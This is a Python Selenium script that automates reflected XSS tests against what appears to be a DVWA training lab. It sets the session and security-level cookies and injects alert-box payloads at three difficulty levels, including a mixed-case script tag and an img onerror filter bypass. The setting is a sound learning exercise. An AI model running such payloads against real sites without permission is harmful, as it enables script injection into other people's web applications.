from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

BASE = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/"
XSS_R_URL = BASE + "vulnerabilities/xss_r/"

def init_driver():
    opt = webdriver.ChromeOptions()
    # opt.add_argument("--headless=new")
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opt)

def set_dvwa_cookie(driver, php_sessid, sec_level):
    driver.get(BASE)
    driver.add_cookie({"name":"PHPSESSID", "value": php_sessid})
    driver.add_cookie({"name":"security", "value": sec_level})

def test_reflected_xss(driver, payload):
    url = f"{XSS_R_URL}?name={payload}"
    print(f"[*]访问 {url}")
    driver.get(url)
    try:
        alert = WebDriverWait(driver,3).until(EC.alert_is_present())
        print("[+]XSS弹窗成功！")
        alert.accept()
    except:
        print("[-]没有触发弹窗")

if __name__ == "__main__":
    PHPSESSID = "ldi9n0nspgemlhdv38su5o9dt3"
    drv = init_driver()

    # Low
    set_dvwa_cookie(drv,PHPSESSID,"low")
    test_reflected_xss(drv,"<script>alert('low xss')</script>")

    # Medium
    # set_dvwa_cookie(drv,PHPSESSID,"medium")
    # test_reflected_xss(drv,"<ScRiPt>alert('medium')</ScRiPt>")

    # High
    # set_dvwa_cookie(drv,PHPSESSID,"high")
    # test_reflected_xss(drv,"<img src=x onerror=alert('high')>")

    time.sleep(2)
    drv.quit()
